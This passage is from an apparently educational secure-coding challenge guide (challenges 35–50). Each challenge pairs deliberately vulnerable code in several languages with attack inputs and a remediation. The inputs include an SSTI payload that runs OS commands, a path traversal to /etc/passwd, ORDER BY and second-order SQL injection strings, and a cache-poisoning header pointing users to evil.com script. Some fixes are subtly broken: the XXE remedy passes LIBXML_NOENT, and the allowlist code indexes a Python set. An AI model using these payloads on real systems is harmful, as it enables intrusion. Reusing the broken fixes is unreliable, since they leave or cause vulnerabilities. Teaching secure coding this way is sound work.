public void transfer(Long fromId, Long toId, BigDecimal amount) {
    Account from = accountRepo.findById(fromId).get();
    if (from.getBalance().compareTo(amount) < 0)
        throw new InsufficientFundsException();
    from.setBalance(from.getBalance().subtract(amount));
    accountRepo.save(from);
}
```

**Remediation:** Use pessimistic locking: `@Lock(LockModeType.PESSIMISTIC_WRITE)` on the `findById` query. Alternatively use an atomic `UPDATE` with `WHERE balance >= amount` and check if rows affected == 1.

---

### Challenge 35 · Insecure Authentication · Medium
**Unvalidated OAuth Redirect URI** — Language: Node.js

**Learning Objective:** Learn to strictly validate OAuth `redirect_uri` to prevent authorization code theft.

**Description:** An OAuth 2.0 authorization server performs only a prefix check on the `redirect_uri` parameter.

**Exploitation Risk:** If the allowed URI is `https://app.com/callback`, a URI like `https://app.com.evil.com/callback` passes the prefix check.

**Vulnerable Code:**
```javascript
// VULNERABLE: Prefix-only redirect_uri validation
function validateRedirectUri(clientId, redirectUri) {
    const client = clients.find(c => c.id === clientId);
    if (redirectUri.startsWith(client.registeredUri)) {
        return true;
    }
    return false;
}
```

**Remediation:** Perform exact string matching:
```javascript
return client.registeredUris.includes(redirectUri);
```
Per RFC 6749, the `redirect_uri` must exactly match the registered value.

---

### Challenge 36 · XML External Entity (XXE) · Medium
**XXE via SVG File Upload** — Language: PHP

**Learning Objective:** Learn that SVG files are XML and must be parsed with external entities disabled.

**Description:** An image upload feature accepts SVG files and processes them with a default XML parser. SVG is XML, so XXE payloads can read arbitrary server files.

**Vulnerable Code:**
```php
<?php
// VULNERABLE: SVG parsed as XML without XXE protection
function processSvgUpload($svgContent) {
    $dom = new DOMDocument();
    $dom->loadXML($svgContent);  // XXE possible here — default loads external entities!
    removeScriptTags($dom);
    return $dom->saveXML();
}
?>
```

**Remediation:** Disable external entities:
```php
libxml_disable_entity_loader(true);
$dom->loadXML($content, LIBXML_NONET | LIBXML_NOENT);
```
Better: convert SVG to a raster image (PNG) using ImageMagick before serving.

---

### Challenge 37 · JWT Misconfiguration · Medium
**Insecure JWT Secret (Weak Key)** — Language: Node.js

**Learning Objective:** Understand the security requirements for JWT signing secrets.

**Description:** A JWT is signed with a short, predictable secret (`secret123`). An attacker can perform an offline brute-force attack using tools like hashcat.

**Exploitation Risk:** A 9-character secret can be brute-forced in minutes on a GPU.

**Vulnerable Code:**
```javascript
// VULNERABLE: Weak JWT secret
const jwt = require('jsonwebtoken');
const JWT_SECRET = 'secret123';  // weak, short, guessable

function generateToken(user) {
    return jwt.sign(
        { id: user.id, role: user.role },
        JWT_SECRET,
        { expiresIn: '24h' }
    );
}
```

**Remediation:** Use a cryptographically random secret of at least 256 bits:
```javascript
JWT_SECRET = crypto.randomBytes(64).toString('hex')
```
Better: switch to RS256 with a 2048-bit RSA key pair.

---

### Challenge 38 · SQL Injection · Medium
**SQL Injection via ORDER BY Clause** — Language: Python

**Learning Objective:** Learn that parameterized queries cannot be used for SQL keywords and how to safely handle them.

**Description:** A search endpoint allows the user to specify a sort column via a query parameter. The column name is injected directly into the `ORDER BY` clause.

**Exploitation Risk:** An attacker can inject `ORDER BY (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')` to perform blind SQL extraction.

**Vulnerable Code:**
```python
# VULNERABLE: ORDER BY injection
@app.route('/products')
def get_products():
    sort_by = request.args.get('sort', 'name')
    order = request.args.get('order', 'ASC')
    query = f"SELECT * FROM products ORDER BY {sort_by} {order}"
    return jsonify(db.execute(query).fetchall())
```

**Remediation:** Validate against an explicit allowlist:
```python
ALLOWED_COLS = {'name', 'price', 'created_at'}
ALLOWED_ORDERS = {'ASC', 'DESC'}
query = 'SELECT * FROM products ORDER BY ' + ALLOWED_COLS[sort_by]
```

---

### Challenge 39 · Security Misconfiguration · Medium
**Unrestricted File Inclusion** — Language: PHP

**Learning Objective:** Understand how dynamic file inclusion with user input leads to local/remote file inclusion.

**Description:** A PHP application includes template files based on a user-supplied `page` parameter.

**Exploitation Risk:** `?page=../../etc/passwd` returns the passwd file. With `allow_url_include=On`, remote PHP code can be included and executed.

**Vulnerable Code:**
```php
<?php
// VULNERABLE: Dynamic file inclusion from user input
$page = $_GET['page'];
include($page . '.php');
?>
```

**Remediation:** Use a strict allowlist:
```php
$allowed = ['home', 'about', 'contact'];
if (in_array($page, $allowed)) {
    include($page . '.php');
} else {
    include('home.php');
}
```
Disable `allow_url_include` and `allow_url_fopen` in `php.ini`.

---

### Challenge 40 · Business Logic Vulnerabilities · Medium
**Business Logic — Negative Quantity in Cart** — Language: Python

**Learning Objective:** Learn to validate business logic constraints, not just technical input validation.

**Description:** A shopping cart API does not validate that item quantities are positive. An attacker can add a negative quantity to reduce the cart total to zero or below.

**Vulnerable Code:**
```python
# VULNERABLE: No quantity sign validation
@app.route('/cart/add', methods=['POST'])
def add_to_cart():
    item_id = request.json['item_id']
    quantity = int(request.json['quantity'])
    price = db.get_price(item_id)
    cart_total = quantity * price  # quantity can be -100!
    db.update_cart(session['user_id'], item_id, quantity)
    return jsonify({'new_total': calculate_total()})
```

**Remediation:** Enforce business constraints: `if quantity <= 0: return error 400`. Validate min/max quantities, recalculate totals server-side, verify the final total is positive before processing payment.

---

## Hard Challenges (41–50)

> Master advanced security concepts including cryptographic weaknesses, complex injection chains, distributed system vulnerabilities, and subtle timing attacks.

---

### Challenge 41 · SQL Injection · Hard
**Second-Order SQL Injection** — Language: Python

**Learning Objective:** Learn how data stored safely can be re-used unsafely, creating second-order injection.

**Description:** A username is safely stored using parameterized queries during registration, but later used in a profile-update query without parameterization.

**Exploitation Risk:** Registering with username `admin'--` allows updating the admin account instead of the attacker's own.

**Vulnerable Code:**
```python
# VULNERABLE: Second-order injection
def register(username, password):
    # Safe: parameterized on write
    db.execute("INSERT INTO users (username,password) VALUES (?,?)",
               (username, bcrypt.hash(password)))

def update_email(current_username, new_email):
    user = db.execute("SELECT username FROM users WHERE id=?",
                      (session['user_id'],)).fetchone()
    username = user['username']  # contains attacker payload!
    # ...but injects it unsafely:
    db.execute(f"UPDATE users SET email='{new_email}'"
               f" WHERE username='{username}'")  # injection!
```

**Remediation:** Parameterize every query that uses database-read values, not just queries that directly use user input:
```python
db.execute('UPDATE users SET email=? WHERE username=?', (new_email, username))
```

---

### Challenge 42 · Security Misconfiguration · Hard
**SSTI — Server-Side Template Injection** — Language: Python

**Learning Objective:** Understand how rendering user-controlled strings as Jinja2 templates enables RCE.

**Description:** An email notification feature renders a user-supplied template string using Jinja2's `render_template_string`.

**Exploitation Risk:** The payload `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` executes arbitrary OS commands.

**Vulnerable Code:**
```python
# VULNERABLE: User-controlled template string rendered by Jinja2
from flask import render_template_string

@app.route('/preview', methods=['POST'])
def preview_email():
    template = request.json.get('template')
    rendered = render_template_string(template)  # RCE!
    return jsonify({'preview': rendered})
```

**Remediation:** Never render user-supplied strings as templates. Use `jinja2.sandbox.SandboxedEnvironment` with strict restrictions. Better: use a logic-less template language (Mustache) for user templates.

---

### Challenge 43 · Insecure Authentication · Hard
**OAuth PKCE Bypass — State Parameter Missing** — Language: TypeScript

**Learning Objective:** Learn how a missing state parameter enables CSRF attacks on OAuth flows.

**Description:** An OAuth 2.0 implementation initiates the authorization flow without a state parameter, allowing an attacker to force the victim's account to be linked to the attacker's authorization code.

**Vulnerable Code:**
```typescript
// VULNERABLE: OAuth flow without state parameter
async function initiateOAuth(req: Request, res: Response) {
    const authUrl = new URL('https://provider.com/oauth/authorize');
    authUrl.searchParams.set('client_id', CLIENT_ID);
    authUrl.searchParams.set('redirect_uri', CALLBACK_URL);
    authUrl.searchParams.set('response_type', 'code');
    authUrl.searchParams.set('scope', 'email profile');
    // Missing: state parameter — CSRF possible on callback!
    res.redirect(authUrl.toString());
}

async function handleCallback(req: Request, res: Response) {
    const { code } = req.query;
    // No state validation!
    const token = await exchangeCode(code as string);
}
```

**Remediation:** Generate a cryptographically random state value, store it in the session, include it in the authorization request, and validate it on callback:
```typescript
if (req.query.state !== req.session.oauthState) return res.status(403).send('CSRF detected');
```

---

### Challenge 44 · Insecure Authentication · Hard
**Timing Attack on HMAC Comparison** — Language: Python

**Learning Objective:** Learn to use constant-time comparison functions to prevent timing-based secret extraction.

**Description:** A webhook handler verifies HMAC signatures using Python's `==` operator, which short-circuits on the first mismatching byte, creating a timing oracle.

**Exploitation Risk:** With ~128 requests per byte position and 32 bytes of HMAC, an attacker can forge a valid signature in ~4096 requests.

**Vulnerable Code:**
```python
# VULNERABLE: Non-constant-time HMAC comparison
import hmac, hashlib

def verify_webhook(payload: bytes, signature: str) -> bool:
    secret = os.environ['WEBHOOK_SECRET'].encode()
    computed = hmac.new(secret, payload, hashlib.sha256).hexdigest()
    return computed == signature  # == returns early on first mismatch!
```

**Remediation:** Use `hmac.compare_digest()` which is implemented in constant time:
```python
return hmac.compare_digest(computed, signature)
```

---

### Challenge 45 · Security Misconfiguration · Hard
**GraphQL Introspection & Batch Query DoS** — Language: Node.js

**Learning Objective:** Learn to disable introspection in production and limit query complexity.

**Description:** A GraphQL API exposes introspection in production and accepts batch queries without depth or complexity limits.

**Exploitation Risk:** A query with 10 levels of nested relationships causes exponential database load. Batch introspection allows silent schema discovery.

**Vulnerable Code:**
```javascript
// VULNERABLE: GraphQL with introspection and no limits
const { ApolloServer } = require('@apollo/server');
const server = new ApolloServer({
    typeDefs,
    resolvers,
    // introspection defaults to true in all environments!
    // No query depth limit, no complexity limit, no batching limit
});
```

**Remediation:** Set `introspection: false` in production. Use `graphql-depth-limit` (`depthLimit(5)`) and `graphql-validation-complexity` to reject expensive queries. Limit batch size and implement query cost analysis.

---

### Challenge 46 · Sensitive Data Exposure · Hard
**Insecure Cryptography — ECB Mode** — Language: Java

**Learning Objective:** Understand why AES-ECB is insecure for encrypting structured data.

**Description:** Credit card numbers are encrypted using AES in ECB mode. ECB encrypts each 16-byte block independently, so identical plaintext blocks produce identical ciphertext blocks — patterns remain visible.

**Exploitation Risk:** Cards sharing the same BIN (first 6 digits) produce identical ciphertext prefixes, allowing partial reconstruction through statistical analysis.

**Vulnerable Code:**
```java
// VULNERABLE: AES-ECB mode
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public byte[] encryptCard(String cardNumber, byte[] key) throws Exception {
    SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");  // ECB!
    cipher.init(Cipher.ENCRYPT_MODE, keySpec);
    return cipher.doFinal(cardNumber.getBytes(StandardCharsets.UTF_8));
}
```

**Remediation:** Use AES-GCM which provides authenticated encryption:
```java
Cipher.getInstance("AES/GCM/NoPadding")
```
Generate a unique 12-byte IV per encryption using `SecureRandom`. Store IV alongside ciphertext.

---

### Challenge 47 · Security Misconfiguration · Hard
**Subdomain Takeover via Dangling DNS** — Language: JavaScript

**Learning Objective:** Learn to audit and remove DNS CNAME records that point to deprovisioned third-party services.

**Description:** A CNAME record for `staging.app.com` points to a cloud provider app that has been deleted. The CNAME still resolves but points to an unclaimed name that an attacker can claim.

**Exploitation Risk:** An attacker claims the deprovisioned resource. `staging.app.com` now serves attacker-controlled content under the company's domain and TLS certificate context.

**Vulnerable Code:**
```javascript
// VULNERABLE: Infrastructure left a dangling DNS CNAME
// staging.app.com CNAME old-app-name.herokuapp.com (resource deleted!)

const config = await fetch('https://staging.app.com/config.json');
// Attacker now controls staging.app.com content!
const { apiKey, featureFlags } = await config.json();
```

**Remediation:** Before deprovisioning any cloud resource, remove the DNS record first. Run periodic audits with tools like `subjack` or `can-i-take-over-xyz`. Implement DNS record lifecycle management in your infrastructure-as-code decommissioning checklist.

---

### Challenge 48 · Insecure Deserialization · Hard
**Deserialization RCE via Java ObjectInputStream** — Language: Java

**Learning Objective:** Learn why deserializing Java objects from untrusted sources enables remote code execution.

**Description:** A REST API endpoint accepts Base64-encoded Java serialized objects and passes them directly to `ObjectInputStream`. Gadget chains in common libraries allow arbitrary code execution.

**Exploitation Risk:** Using ysoserial, an attacker generates a payload targeting CommonsCollections that runs `Runtime.exec('id')` — a critical RCE requiring no authentication.

**Vulnerable Code:**
```java
// VULNERABLE: Deserializing untrusted ObjectInputStream data
@PostMapping("/api/session/restore")
public ResponseEntity<?> restoreSession(
        @RequestBody String base64Data) throws Exception {
    byte[] bytes = Base64.getDecoder().decode(base64Data);
    ObjectInputStream ois =
        new ObjectInputStream(new ByteArrayInputStream(bytes));
    SessionData session = (SessionData) ois.readObject();  // RCE!
    sessionManager.restore(session);
    return ResponseEntity.ok("Session restored");
}
```

**Remediation:** Never deserialize data from untrusted sources using Java `ObjectInputStream`. Use JSON (Jackson) or Protocol Buffers instead. If Java serialization is unavoidable, use a filtering `ObjectInputStream` that whitelists expected classes.

---

### Challenge 49 · SSRF · Hard
**DNS Rebinding Attack on Internal API** — Language: Python

**Learning Objective:** Learn how DNS rebinding bypasses IP-based SSRF protections.

**Description:** An SSRF protection function resolves the hostname and checks against a blocklist, but the DNS resolution and the HTTP request are separate operations. An attacker-controlled DNS server returns a public IP for the check, then a private IP for the actual connection.

**Exploitation Risk:** The protection resolves `attacker.com` and gets `8.8.8.8` (passes check). The HTTP client resolves it again milliseconds later and the attacker's DNS now returns `192.168.1.1`.

**Vulnerable Code:**
```python
# VULNERABLE: DNS rebinding bypass
import socket, requests

def safe_fetch(url):
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)  # resolve once to check
    private_ranges = ['10.', '172.16.', '192.168.', '127.']
    if any(ip.startswith(r) for r in private_ranges):
        raise ValueError("Private IP blocked")
    # DNS can rebind between this check and the actual request!
    return requests.get(url, timeout=5)
```

**Remediation:** Resolve the hostname once, verify the IP, then connect to the resolved IP directly (not the hostname) to prevent re-resolution:
```python
socket.create_connection((resolved_ip, port))
```
Alternatively use a dedicated SSRF-protection library like `ssrf_py` or a proxy service (Smokescreen).

---

### Challenge 50 · Security Misconfiguration · Hard
**Cache Poisoning via Unkeyed Headers** — Language: Node.js

**Learning Objective:** Understand how unkeyed HTTP headers in cache configurations enable cache poisoning attacks.

**Description:** A CDN cache uses the URL as the cache key but does not include the `X-Forwarded-Host` header. A response reflecting this header is cached and served to all subsequent users.

**Exploitation Risk:** An attacker sends `X-Forwarded-Host: evil.com`. The app reflects this in an absolute URL in the response (for a JS include). The poisoned response is cached and all users load the attacker's JavaScript.

**Vulnerable Code:**
```javascript
// VULNERABLE: Reflecting unkeyed header into response
app.use((req, res, next) => {
    const host = req.headers['x-forwarded-host'] || req.hostname;
    // Attacker sets X-Forwarded-Host: evil.com
    res.locals.cdnBase = `https://${host}/static`;
    next();
});

app.get('/', (req, res) => {
    // Cached response includes: <script src="https://evil.com/static/app.js">
    res.render('index', { cdnBase: res.locals.cdnBase });
});
```

**Remediation:** Never reflect attacker-influenced headers (`X-Forwarded-Host`, `X-Original-URL`) into responses. Configure the CDN to include all response-influencing headers in the cache key. Use a static, hardcoded CDN base URL from configuration rather than request headers.

---

## Security Best Practices Summary

### 1. Input Validation & Sanitization
Always validate input on the server side. Use allowlists over blocklists. Parameterize every database query regardless of the data source. Sanitize output based on context (HTML, JS, URL, SQL).

### 2. Authentication & Session Management
Hash passwords with bcrypt/Argon2id (min cost 12). Use cryptographically secure random values for all tokens. Set cookies with `HttpOnly`, `Secure`, and `SameSite=Strict`. Implement MFA for privileged accounts.

### 3. Authorization (Access Control)
Apply least privilege everywhere. Verify authorization server-side on every request. Use role-based or attribute-based access control. Deny by default — explicitly grant access rather than explicitly denying it.

### 4. Cryptography
Use AES-GCM or ChaCha20-Poly1305 (authenticated encryption). Avoid ECB mode, MD5, SHA-1, and DES. Use TLS 1.2+ with strong cipher suites. Store secrets in a vault, not in source code or environment variables checked into version control.

### 5. Secure Dependencies & Configuration
Pin dependency versions and scan with SCA tools (Snyk, Dependabot). Remove default credentials, disable unnecessary features, and keep software patched. Use security headers (`helmet.js`, HSTS, CSP). Run with minimum OS privileges.

### 6. Error Handling & Logging
Return generic errors to users; log details server-side with no sensitive data. Use structured logging with tamper-evident storage. Monitor for anomalies. Never log passwords, tokens, card numbers, or PII.

### 7. API & Third-Party Security
Validate all OAuth state parameters and redirect URIs exactly. Rate-limit all public endpoints. Disable GraphQL introspection in production. Audit DNS records when deprovisioning cloud resources. Use constant-time comparison for all secret/token comparisons.

### 8. Threat Modeling & Secure SDLC
Perform threat modeling early in the design phase. Integrate SAST/DAST tools in CI/CD pipelines. Conduct regular penetration testing. Train developers on OWASP Top 10 and secure coding standards. Build a responsible disclosure program.

---

*This document is intended for educational purposes to help developers recognize, understand, and remediate common security vulnerabilities. Always practice in authorized environments only.*